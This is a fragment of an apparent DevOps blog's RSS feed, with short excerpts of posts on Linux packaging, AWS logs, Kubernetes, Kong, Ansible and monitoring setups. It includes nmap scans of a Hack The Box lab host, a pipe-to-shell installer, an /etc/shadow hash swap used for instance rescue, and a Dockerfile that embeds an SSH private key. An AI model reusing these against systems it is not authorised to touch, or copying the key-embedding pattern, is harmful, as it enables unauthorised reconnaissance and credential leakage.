+            How to upgrade the some packages 1dpkg -L libssh2-1 # view the package use which files 2dpkg -s libssh2-1 # view the package infos 3# install the checkinstall 4echo &amp;#34;deb http://ftp.de.debian.org/debian bullseye main&amp;#34; &amp;gt;&amp;gt; /etc/apt/sources.list 5apt update 6apt install checkinstall 7tar -zxvf source-app.tar.gz 8cd source 9./configure 10make 11checkinstall --install=no Upgrade the single package in debian 1apt-cache madison systemd 2apt-get install libglib2.0-0=2.66.8-1+deb11u3 relative the docs about debian repo debian releases support versions for stretch old debian 1# pls reference: https://www.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>AWS vpc flow logs insight</title>
+      <link>https://blog.wisekee.com/post/aws-logs-insight/</link>
+      <pubDate>Sat, 10 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-logs-insight/</guid>
+      <description>
+        
+          
+            Define pattern for log groups in cloudwatch Create filter pattern filter pattern: [action, azid, bytes, dstaddr,dstport,instanceid,protocol,srcaddr,srcport,subnetid] Metric namespaces Name for metric namespace Metric name: bytes Metric value: $bytes Unit: Bytes Dimensions: Dimension Name: dst-addr, Dimension Value: $dstaddr Determine NAT gateway logs 1# if network interface format is: 2# ${version} ${account-id} ${interface-id} ${srcaddr} ${dstaddr} ${srcport} ${dstport} ${protocol} ${packets} ${bytes} ${start} ${end} ${action} ${log-status} 3fields @timestamp 4| parse @message &amp;#34;* * * * * * * * * *&amp;#34; as action, azid, bytes, dstaddr,dstport,instanceid,protocol,srcaddr,srcport,subnetid 5| stats sum(bytes) as bytesTransferred by srcaddr, dstaddr 6| sort bytesTransferred desc VPC transit gateway flow logs Create filter pattern [version, resource_type, account_id,tgw_id, tgw_attachment_id, tgw_src_vpc_account_id, tgw_dst_vpc_account_id, tgw_src_vpc_id, tgw_dst_vpc_id, tgw_src_subnet_id, tgw_dst_subnet_id, tgw_src_eni, tgw_dst_eni, tgw_src_az_id, tgw_dst_az_id, tgw_pair_attachment_id, srcaddr, dstaddr, srcport, dstport, protocol, packets, bytes,start,end, log_status, type,packets_lost_no_route, packets_lost_blackhole, packets_lost_mtu_exceeded, packets_lost_ttl_expired, tcp_flags,region, flow_direction, pkt_src_aws_service, pkt_dst_aws_service] Metric namespaces Name for metric namespace Metric name: bytes Metric value: $bytes Unit: Bytes Dimensions: Dimension Name: account_id, Dimension Value: $account_id Determine VPC transit gateway logs 1fields @timestamp 2 | parse @message &amp;#34;* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *&amp;#34; as version, resource_type, account_id,tgw_id, tgw_attachment_id, tgw_src_vpc_account_id, tgw_dst_vpc_account_id, tgw_src_vpc_id, tgw_dst_vpc_id, tgw_src_subnet_id, tgw_dst_subnet_id, tgw_src_eni, tgw_dst_eni, tgw_src_az_id, tgw_dst_az_id, tgw_pair_attachment_id, srcaddr, dstaddr, srcport, dstport, protocol, packets, bytes,start,end, log_status, type,packets_lost_no_route, packets_lost_blackhole, packets_lost_mtu_exceeded, packets_lost_ttl_expired, tcp_flags,region, flow_direction, pkt_src_aws_service, pkt_dst_aws_service 3| sort bytes desc 
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Local fast proxy chain access tool</title>
+      <link>https://blog.wisekee.com/post/local-proxychain-tools/</link>
+      <pubDate>Sat, 10 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/local-proxychain-tools/</guid>
+      <description>
+        
+          
+            proxychains ng (new generation) - a preloader which hooks calls to sockets in dynamically linked programs and redirects it through one or more socks/http proxies. continuation of the unmaintained proxychains project https://github.com/rofl0r/proxychains-ng
+Install 1# On macos 2 HOMEBREW_NO_UPDATE=1 brew install proxychains-ng 3# On linux 4# needs a working C compiler, preferably gcc 5 ./configure --prefix=/usr --sysconfdir=/etc 6 make 7 sudo make install 8 sudo make install-config (installs proxychains.conf) Configuration Create and config file path ~/.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Docker can&#39;t start in mac os</title>
+      <link>https://blog.wisekee.com/post/macos-docker-notworking/</link>
+      <pubDate>Mon, 05 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/macos-docker-notworking/</guid>
+      <description>
+        
+          
+            When upgraded the Docker Desktop it&amp;rsquo;s can&amp;rsquo;t starting in MacOs
+Use AppCleaner remove Docker Destop Open Activity Monitor Force quit the Docker and Docker backend process, then open AppCleaner drag the Docker icon in Application list to AppCleaner remove the Docker
+Download Dokcer.dmg in Docker offical site and reinstalling 1 sudo hdiutil attach Docker.dmg 2 sudo /Volumes/Docker/Docker.app/Contents/MacOS/install 3 sudo hdiutil detach /Volumes/Docker Setings and change if maybe not working sudo vi ~/Library/Group\ Containers/group.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>istio getting started</title>
+      <link>https://blog.wisekee.com/post/istio-getting-started/</link>
+      <pubDate>Mon, 05 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/istio-getting-started/</guid>
+      <description>
+        
+          
+            installing the istio 1# downloading the istio compress archive and the script will auto uncompress 2curl -L https://istio.io/downloadIstio | ISTIO_VERSION=1.16.1 sh - 3# for easier usage 4export PATH=$PWD/bin:$PATH 5# check the version 6./bin/istioctl version 7# check the requirments 8./bin/istioctl x precheck 9# installing components to local k8s cluster 10./bin/istioctl install --set profile=demo -y 11# enable injection in the default namespace 12kubectl label namespace default istio-injection=enabled 13# verify the install result 14istioctl verify-install Generally commands 1k get MutatingWebhookConfiguration 2k get validatingWebhookConfiguration 3kubectl describe configmap istio-sidecar-injector -n istio-system 4istioctl proxy-config secret istio-ingressgateway-xxxxxxx.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Use webpack bundle the frontend sample example</title>
+      <link>https://blog.wisekee.com/post/webpack-sample-settings/</link>
+      <pubDate>Fri, 18 Nov 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/webpack-sample-settings/</guid>
+      <description>
+        
+          
+            Initialization the structure 1# make the demo folder 2mkdir webpack-demo 3 4# init the project 5cd webpack-demo 6npm init -y 7npm install webpack webpack-cli --save-dev 8 9# set the project to private prevent and accidental publish to public hub 10# add the `&amp;#34;private&amp;#34;: true,` to package.json 11 12# create config file for webpack keep empty temporary 13touch webpack.config.js 14 15mkdir dist src 16touch dist/index.html 17touch src/index.js A little the code to src/index.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Kong and Konga deployment</title>
+      <link>https://blog.wisekee.com/post/kong-and-konga-deployment/</link>
+      <pubDate>Sat, 05 Nov 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/kong-and-konga-deployment/</guid>
+      <description>
+        
+          
+            Installing the Kong use docker compose 1git clone https://github.com/Kong/docker-kong 2cd docker-kong/compose/ 3KONG_DATABASE=postgres docker-compose --profile database up Running Kong admin use docker 1# refer to network name with kong docker compose resource same. 2# https://hub.docker.com/r/pantsel/konga/ 3docker run --platform=linux/amd64 -it --rm -p 1337:1337 --network compose_kong-net --name konga -e &amp;#34;NODE_ENV=production&amp;#34; -e &amp;#34;TOKEN_SECRET=xxxxxxx&amp;#34; pantsel/konga Setting Kong 1# add kong admin api to services 2curl --location --request POST &amp;#39;http://localhost:8001/services/&amp;#39; \ 3--header &amp;#39;Content-Type: application/json&amp;#39; \ 4--data-raw &amp;#39;{ 5 &amp;#34;name&amp;#34;: &amp;#34;admin-api&amp;#34;, 6 &amp;#34;host&amp;#34;: &amp;#34;localhost&amp;#34;, 7 &amp;#34;port&amp;#34;: 8001 8}&amp;#39; 9# add admin api route 10curl --location --request POST &amp;#39;http://localhost:8001/services/admin-api/routes&amp;#39; \ 11--header &amp;#39;Content-Type: application/json&amp;#39; \ 12--data-raw &amp;#39;{ 13 &amp;#34;paths&amp;#34;: [&amp;#34;/admin-api&amp;#34;] 14}&amp;#39; 15# testing admin api from kong gateway 16curl localhost:8000/admin-api/ 17# enable key auth plugin for admin api 18curl -X POST http://localhost:8001/services/admin-api/plugins \ 19 --data &amp;#34;name=key-auth&amp;#34; 20# add kong admin as consumer 21curl --location --request POST &amp;#39;http://localhost:8001/consumers/&amp;#39; \ 22--form &amp;#39;username=konga&amp;#39; \ 23--form &amp;#39;custom_id=cebd360d-3de6-4f8f-81b2-31575fe9846a&amp;#39; 24# create api key form konga 25curl --location --request POST &amp;#39;http://localhost:8001/consumers/e7b420e2-f200-40d0-9d1a-a0df359da56e/key-auth&amp;#39; https://dev.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Auto tools makefile getting started</title>
+      <link>https://blog.wisekee.com/post/makefile-getting-started/</link>
+      <pubDate>Thu, 20 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/makefile-getting-started/</guid>
+      <description>
+        
+          
+            Basic the Makefile format First make sure ~/.vimrc settings for tab spaces 1# define the .vimrc file to following contents 2cat ~/.vimrc 3set noexpandtab 4set autoindent Small snippet Makefile contents 1.DEFAULT_GOAL:=build 2 3fmt: 4	echo &amp;#34;this is fmt....&amp;#34; 5 6.PHONY:vet 7vet:fmt 8	echo &amp;#34;this is vet...&amp;#34; 9 10 11build:vet 12	echo &amp;#34;this is build...&amp;#34; In the directory execute make should display the result. 1echo &amp;#34;this is fmt....&amp;#34; 2this is fmt.... 3echo &amp;#34;this is vet.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Hackthebox generally </title>
+      <link>https://blog.wisekee.com/post/hackthebox-operations/</link>
+      <pubDate>Sun, 16 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/hackthebox-operations/</guid>
+      <description>
+        
+          
+            HOMEBREW_NO_UPDATE=1 brew install inetutils
+nmap -A 10.129.186.124
+nmap -sV -sC X.X.X.X
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Setup the jenkins agent in kubernetes cluster use pods</title>
+      <link>https://blog.wisekee.com/post/jenkins-eks-agent/</link>
+      <pubDate>Sat, 15 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/jenkins-eks-agent/</guid>
+      <description>
+        
+          
+            Supplement When you upgrade the jenkins.war in docker container, commit to another tag the Entrypoint and CMD is lost So can commit specific the Entrypoint and CMD 1docker commit --change=&amp;#39;ENTRYPOINT [/usr/bin/tini&amp;#34;, &amp;#34;--&amp;#34;, &amp;#34;/usr/local/bin/jenkins.sh&amp;#34;]&amp;#39; --change=&amp;#39;CMD [/usr/local/bin/jenkins.sh&amp;#34;]&amp;#39; &amp;lt;container_id&amp;gt; new_image_name Basic settings Add Global credentials the Secret is kubernetes login token Add new cloud configure in Manage Jenkins &amp;ndash;&amp;gt; Clouds Config the Kubernetes Clouds websocket connection, use internal jenkins URL, specific the Pod Labels, Pod Retention: On Failure, Max connections, Seconds to wait for pod Add Pod template settings Specific Namespace, Usage: Only build jobs with label expressions matching this node Container Template: jnlp: jenkins/inbound-agent:latest, Working directory: /home/jenkins/agent Command to run: /usr/local/bin/jenkins-agent You can specific Volumes to mount cache etc.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>How to rescue ec2 linux when upgrade the kernel failed</title>
+      <link>https://blog.wisekee.com/post/ec2-linux-kernel-rescue/</link>
+      <pubDate>Thu, 11 Aug 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/ec2-linux-kernel-rescue/</guid>
+      <description>
+        
+          
+            rescue steps Force stop the failed ec2 instance Detach the root ebs volume Launch new ec2 instance need support Nitro System the instance type and attach the previous EBS volume Add new user in new ec2 instance and get the /etc/shadows encrypt password copy to old device same file administrator user overide the line Detach the ebs volume from new instance and stop it Retach the ebs volume to first ec2 and start it use serial console connect to it and use overide the user credetials to fix some issue Or immediately fix some problem in new ec2 useful command or script 1# list the installed kernel 2dpkg --list | grep linux-image 3apt list --installed | egrep &amp;#39;^linux&amp;#39; | grep $(uname -r) 4# view some logs 5grep $(uname -r) /var/log/dpkg.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Forward the traffic to internal server through iptables rule use bastion server</title>
+      <link>https://blog.wisekee.com/post/iptables-forward-traffic/</link>
+      <pubDate>Mon, 18 Jul 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/iptables-forward-traffic/</guid>
+      <description>
+        
+          
+            Sometimes we have access internal service or server in local network,needs through external bastion server bridge to.
+1# The traffic forward to internal environment through bastion iptables rule diagram 2 3# local or office ------&amp;gt; bastion machine ----------&amp;gt; internal server 4# local access bastion-public-ip:8888 -----&amp;gt; bastion iptables rules ----&amp;gt; internal server:80 5 6# display iptalbes nat rules 7iptables -t nat -L 8 9# add prepostrouting rule to chain 10iptables -t nat -A PREROUTING -p tcp -m tcp --dport 8899 -j DNAT --to-destination 192.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Kubernetes and Cloud native security checklist</title>
+      <link>https://blog.wisekee.com/post/kubernetes-security-checklist/</link>
+      <pubDate>Wed, 06 Apr 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/kubernetes-security-checklist/</guid>
+      <description>
+        
+          
+            Cloud native workflow security checklist
+Development security Integrate Code Scanning at the CI/CD Process
+SAST (Static Application Security Testing) tools sonarqube, gosec various language lint itegration the IDE plugins Enabled the gitlab ci security or github action scan Reduce external vulnerabilities via dependency scanning
+various language dependency check(npm, maven, go.mod, reqirements.txt) dependency-check plugin Use image scanning to analyze container images
+Avoid unnecessary privileges
+Rootless containers Make sure the user specified in the USER instruction exists inside the container.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>K8S app source code and runtime separate in pod</title>
+      <link>https://blog.wisekee.com/post/k8s-app-runtime-sparate/</link>
+      <pubDate>Thu, 10 Mar 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/k8s-app-runtime-sparate/</guid>
+      <description>
+        
+          
+            In a k8s environment, it is a good choice to have the application runtime and source code build packages separated in separate containers
+Smallest source code build image use a smallest base image to build docker image store source code build result package
+1FROM alpine:latest 2WORKDIR /var/www 3COPY app /var/www/app Use different images of the runtime environment according to different programming languages 1FROM python:3.6.15-slim 2 3RUN pip install boto3 Build app image and runtime image 1# build the app image 2docker build .
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Awesome open resoure tools and project</title>
+      <link>https://blog.wisekee.com/post/awesome-open-source/</link>
+      <pubDate>Sat, 05 Mar 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/awesome-open-source/</guid>
+      <description>
+        
+          
+            There are often some excellent blogs and open source website learning resources that need to be recorded Also for better sharing and dissemination, so the total continues below.
+Cloud native and kubernetes https://github.com/labring/sealos(kubernetes-kernel-based cloud os! Let&amp;rsquo;s sealos run kubernetes and applications.) https://github.com/kubevela/kubevela(The Modern Application Platform.) https://github.com/crossplane/crossplane(Cloud Native Control Planes multi cloud resoures) https://promcat.io/(A resource catalog for enterprise-class Prometheus) https://hub.datree.io/(Prevent Kubernetes misconfigurations from reaching production) https://aws.github.io/aws-eks-best-practices/(EKS Best Practices Guides) https://github.com/koderover/zadig(Zadig is a cloud native, distributed, developer-oriented continuous delivery product) https://github.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Postgresql common commands operations</title>
+      <link>https://blog.wisekee.com/post/postgresql-commands/</link>
+      <pubDate>Wed, 02 Mar 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/postgresql-commands/</guid>
+      <description>
+        
+          
+            Data export and import 1# install postgresql in macos 2brew install postgresql@15 3# settings to the path variable 4echo &amp;#39;export PATH=&amp;#34;/opt/homebrew/opt/postgresql@15/bin:$PATH&amp;#34;&amp;#39; &amp;gt;&amp;gt; ~/.zshrc 5 6# dump database to sql file 7pg_dump --host xxxxx.eu-west-1.compute.amazonaws.com --port 5432 --user username database &amp;gt; backup.sql 8 9# change username password 10ALTER USER user_name WITH PASSWORD &amp;#39;new_password&amp;#39;; 11# import the data to postgresql 12psql --host x.x.x.x --user dba --db postgres &amp;lt; dump-xxx-xxxx.sql Reference Importing and exporting data in PostgreSQL 
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Getting started typescript minimal project</title>
+      <link>https://blog.wisekee.com/post/minimal-typescript-demo/</link>
+      <pubDate>Thu, 20 Jan 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/minimal-typescript-demo/</guid>
+      <description>
+        
+          
+            Create project structure and install nessess 1mkdir -p ~/code/exercise/ts-demo &amp;amp;&amp;amp; cd &amp;#34;$_&amp;#34; 2npm init 3mkdir src 4touch tsconfig.json 5npm i --save-dev @types/node 6npm i --save-dev @types/express 7npm i --save-dev @types/mocha 8npm i express 9npm i nodemon The src/App.ts content 1import * as express from &amp;#39;express&amp;#39; 2 3class App { 4 public express 5 6 constructor () { 7 this.express = express() 8 this.mountRoutes() 9 } 10 11 private mountRoutes (): void { 12 const router = express.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Awesome blog&#39;s resoures</title>
+      <link>https://blog.wisekee.com/post/awesome-blog-resources/</link>
+      <pubDate>Mon, 10 Jan 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/awesome-blog-resources/</guid>
+      <description>
+        
+          
+            There are often some excellent blogs and open source website learning resources that need to be recorded Also for better sharing and dissemination, so the total continues below.
+Recommend getting stared study resources https://docs.microsoft.com/en-us/learn/browse/(Microsoft products with step-by-step guidance) https://developer.mozilla.org/en-US/docs/Learn(Mizzla learn guides about web development) https://programming.guide/go/(Articles on Programming Guide) https://gobyexample.com/(hands-on introduction to Go using annotated example programs) https://roadmap.sh/(Step by step guides and paths to learn different tools or technologies) https://zetcode.com/(provides accessible tutorials for Go, C#, Python, Java, and JavaScript programming languages.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Software development security lifecycle terminology</title>
+      <link>https://blog.wisekee.com/post/software-deployment-security-terminology/</link>
+      <pubDate>Mon, 10 Jan 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/software-deployment-security-terminology/</guid>
+      <description>
+        
+          
+            General terminology of Software development Software Composition Analysis(SCA) Static Application Security Testing (SAST) Dynamic Application Security Testing (DAST) Runtime Application Self-Protection (RASP) information security (InfoSec) Integrated Development Environment (IDE) Common Vulnerabilities and Exposures (CVE) Version Control System (VCS) AWS Security Finding Format (ASFF) Proof of Concept (POC) IT Service Management (ITSM) distributed denial of service (DDoS) Other terminology of SDLC Test-driven development (TDD) Scaled Agile Framework (SAFe) Large-Scale Scrum (LeSS) Some usefuly tools and site url (malicious)[https://zeltser.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>launch testing kubernetes cluster in local use Kind</title>
+      <link>https://blog.wisekee.com/post/k8s-local-cluster-kind/</link>
+      <pubDate>Sat, 25 Dec 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/k8s-local-cluster-kind/</guid>
+      <description>
+        
+          
+            The config for kind cluster settings the expose port didn&amp;rsquo;t change when cluster launched, need prepared
+1kind: Cluster 2apiVersion: kind.x-k8s.io/v1alpha4 3networking: 4 # WARNING: It is _strongly_ recommended that you keep this the default 5 # (127.0.0.1) for security reasons. However it is possible to change this. 6 apiServerAddress: &amp;#34;127.0.0.1&amp;#34; 7 # This can connect to k8s from external when install kind in virtual host or cloud platform(ec2 of aws) 8 # By default the API server listens on a random open port.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Go language private registry glance</title>
+      <link>https://blog.wisekee.com/post/go-private-package-registry-athens/</link>
+      <pubDate>Thu, 09 Dec 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/go-private-package-registry-athens/</guid>
+      <description>
+        
+          
+            Setup GO private package repositry ATHENS for project development Use Nexus proxy access public go package and private repository repo
+1#The access workflow 2 3 |------&amp;gt; proxy-public internal 4internal.pack.com/goproxy---&amp;gt;nexus 5 |------&amp;gt;athens---&amp;gt;nginx---&amp;gt; private gitlab The pull package workflow - set the environment variable `export GOPROXY=internal.pack.com/goproxy`- setup nexus proxy the internal athens and public go proxy repo- the athens access internal gitlab code repo needs nginx rewrite the some paths- because athens needs https access the code repoGenerate the private certificate 1openssl req -x509 -nodes -days 876000 -newkey rsa:2048 -keyout /etc/ssl/private/nginx-selfsigned.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Offline install and setup kubernetes cluster in internal network</title>
+      <link>https://blog.wisekee.com/post/k8s-cluster-offline-setup/</link>
+      <pubDate>Mon, 15 Nov 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/k8s-cluster-offline-setup/</guid>
+      <description>
+        
+          
+            Sometimes enterprise is ineternal network not has internet network in production The offline installing and setup k8s environment and resources is necessery Prepare the terraform environment Download the Terraform binary terraform You can also download the HELM binary to operate the k8s cluster. 1wget https://releases.hashicorp.com/terraform/0.15.4/terraform_0.15.4_linux_amd64.zip 2unzip terraform_0.15.4_linux_amd64.zip 3mv terraform /usr/local/bin/ 4chmod +x /usr/local/bin/terraform 5terraform version Prepare the Terraform syntax tips plugins in idea IDE https://plugins.jetbrains.com/plugin/7808-hashicorp-terraform--hcl-language-support
+Because the Terraform plugins and providers Offline to local directory and push to CVS repo so needs to install git lfs plugins
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Launch Consul&#43;Nomad&#43;Vault through Ansible Role</title>
+      <link>https://blog.wisekee.com/post/launch-hashistack-through-ansible/</link>
+      <pubDate>Wed, 20 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/launch-hashistack-through-ansible/</guid>
+      <description>
+        
+          
+            Sometimes we need to manage distributed task scheduling and secure clandestine transport, so introducing HashiStack is a good choice
+Prepare Ansible script and playbook I choice the following playbook roles for stacks,But I changed things to suit my own needs
+Consul: github url Nomad: github url Vault use both repo community-ansibleand MiteshSharma/AnsiblevaultRole 1# The playbook folder level 2├── site.yml 3├── nomad-dev.local 4├── ansible.cfg 5├── roles 6│ ├── consul 7│ └── nomad 8│ └── vault 9└── group_vars 10 ├── consul 11 └── nomad 12 └── vault the ansible.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Deploymnet Prometheus&#43;Grafana in single machine use docker-compose service</title>
+      <link>https://blog.wisekee.com/post/deployment-promethues-grafana/</link>
+      <pubDate>Sat, 25 Sep 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/deployment-promethues-grafana/</guid>
+      <description>
+        
+          
+            Deploymnet Prometheus+Grafana in single machine use docker-compose service Collect and report node status in grafana dashboard, through node-exporter and process-exporter to promethues tsdb
+Setup and install relative components 1#update the system and install docker component 2yum update -y 3yum install -y yum-utils 4yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo 5yum install -y docker-ce docker-ce-cli containerd.io 6systemctl enable docker 7systemctl start docker 8mkdir -p /data/monitor/{alertmanager,prometheus/{config,data},consul/data,grafana/data} 9chmown -R 1000:1000 /data/monitor 10chmod -R 777 /data/monitor/grafana Download the monitoring relative docker images 1docker pull prom/prometheus:latest 2docker pull grafana/grafana:latest 3docker pull prom/alertmanager:latest 4docker pull prom/pushgateway:latest 5docker pull consul:latest Prepare docker-compose.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Use Ansible docker container in daily development</title>
+      <link>https://blog.wisekee.com/post/make-ansible-docker-image/</link>
+      <pubDate>Mon, 20 Sep 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/make-ansible-docker-image/</guid>
+      <description>
+        
+          
+            Make Ansible docker image for CI/CD workfolws Sometimes need connect to the remote host use publickey and jump server,copy the ssh key to docker image is necessary
+The Dockerfile 1FROM centos:7 2 3ARG SSH_PRIVATE_KEY 4ARG SSH_HOST_CONFIG 5 6RUN curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo &amp;amp;&amp;amp; \ 7 yum clean all &amp;amp;&amp;amp; yum makecache fast &amp;amp;&amp;amp; \ 8 yum install -y epel-release gcc libffi-devel openssh-clients git wget &amp;amp;&amp;amp; \ 9 yum install -y python python2-pip ansible 10 11RUN python -m pip install &amp;#34;pysocks&amp;#34; &amp;#34;pyspnego==0.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Launch and setup the ELK stack use docker compose service</title>
+      <link>https://blog.wisekee.com/post/docker-compose-elk/</link>
+      <pubDate>Fri, 10 Sep 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/docker-compose-elk/</guid>
+      <description>
+        
+          
+            install ELK stack use docker-compose Install and setup ELK stack in single machine use docker compose service. and uesfilebeat ship the logs
+settings the centos system 1sudo yum install -y yum-utils 2sudo yum-config-manager \ 3 --add-repo \ 4 https://download.docker.com/linux/centos/docker-ce.repo 5sudo yum install docker-ce docker-ce-cli containerd.io 6systemctl enable docker 7systemctl start docker 8# install the docker-compose 9sudo curl -L &amp;#34;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)&amp;#34; -o /usr/local/bin/docker-compose 10chmod +x /usr/local/bin/docker-compose 11 12# adjust the system parmeters 13echo &amp;#34;vm.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Ansible encrypt and decrypt the secure fields</title>
+      <link>https://blog.wisekee.com/post/ansible-encrypt-secure/</link>
+      <pubDate>Sun, 18 Jul 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/ansible-encrypt-secure/</guid>
+      <description>
+        
+          
+            Wrap the ansible vault scripts 1#!/usr/bin/env bash 2 3[ &amp;#34;$#&amp;#34; -gt 2 ] || { 4 echo &amp;#34;Usage $0 encrypt|decrypt option...&amp;#34; 5 echo &amp;#34;Must be least three argumeents required&amp;#34; 6 exit 1 7} 8 9#the decrypt key file path, also can put the aws ssm 10vault_id=&amp;#39;/opt/ansible_pass&amp;#39; 11 12 13function encrypt() { 14 ansible-vault encrypt_string --vault-password-file $1 $2 --name $3 15} 16 17function decrypt() { 18 ansible -i $1 $2 -m ansible.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Elastic cloud ingest pipeline template</title>
+      <link>https://blog.wisekee.com/post/elastic-cloud-ingest-pipeline/</link>
+      <pubDate>Sun, 18 Jul 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/elastic-cloud-ingest-pipeline/</guid>
+      <description>
+        
+          
+            The syntax ingest pipeline template convenient for search
+1[ 2 { 3 &amp;#34;grok&amp;#34;: { 4 &amp;#34;field&amp;#34;: &amp;#34;message&amp;#34;, 5 &amp;#34;patterns&amp;#34;: [ 6 &amp;#34;%{IPORHOST:remote_addr} - %{USERNAME:remote_user} \\[%{HTTPDATE:time_local}\\] \\\&amp;#34;%{DATA:request}\\\&amp;#34; %{INT:status} %{NUMBER:bytes_sent} \\\&amp;#34;%{DATA:http_referer}\\\&amp;#34; \\\&amp;#34;%{DATA:http_user_agent}\\\&amp;#34; \\\&amp;#34;%{DATA:http_x_forwarded_for}\\\&amp;#34; rt=\\\&amp;#34;(?:%{NUMBER:request_time}|-)\\\&amp;#34; uct=\\\&amp;#34;(?:%{NUMBER:upstream_connect_time}|-)\\\&amp;#34; uht=\\\&amp;#34;(?:%{NUMBER:upstream_header_time}|-)\\\&amp;#34; urt=\\\&amp;#34;(?:%{NUMBER:upstream_response_time}|-)\\\&amp;#34;&amp;#34; 7 ], 8 &amp;#34;ignore_missing&amp;#34;: true, 9 &amp;#34;if&amp;#34;: &amp;#34;ctx.source.toLowerCase().contains(&amp;#39;nginx&amp;#39;)&amp;#34;, 10 &amp;#34;ignore_failure&amp;#34;: true, 11 &amp;#34;description&amp;#34;: &amp;#34;nginx&amp;#34; 12 } 13 }, 14 { 15 &amp;#34;grok&amp;#34;: { 16 &amp;#34;field&amp;#34;: &amp;#34;source&amp;#34;, 17 &amp;#34;patterns&amp;#34;: [ 18 &amp;#34;^/var/www/webapp/logs/(?&amp;lt;app_id&amp;gt;[^/]+)&amp;#34; 19 ], 20 &amp;#34;ignore_missing&amp;#34;: true, 21 &amp;#34;if&amp;#34;: &amp;#34;ctx.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>ECK stack up and running and collect logs use fluentd in kubernetes</title>
+      <link>https://blog.wisekee.com/post/eck-vs-flutd-collect-logs/</link>
+      <pubDate>Thu, 15 Jul 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/eck-vs-flutd-collect-logs/</guid>
+      <description>
+        
+          
+            Use the Elasticsearch cloud on k8s component as logs and apm platform. the Fluentd collect the kubernetes container logs to Elasticsearch and kibana represent and search
+The ECK operator configure The ECK operator custom resources use kubectl providers.
+1terraform { 2 required_providers { 3 kubectl = { 4 source = &amp;#34;gavinbunney/kubectl&amp;#34; 5 version = &amp;#34;1.11.1&amp;#34; 6 } 7 } 8} 9 10resource &amp;#34;helm_release&amp;#34; &amp;#34;eck-operator&amp;#34; { 11 chart = &amp;#34;${path.module}/../../../../../charts/eck-operator&amp;#34; 12 name = &amp;#34;eck-operator&amp;#34; 13 namespace = &amp;#34;kube-monitor&amp;#34; 14 15 values = [ 16 &amp;lt;&amp;lt;-EOF 17 image: 18 repository: &amp;#34;${var.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
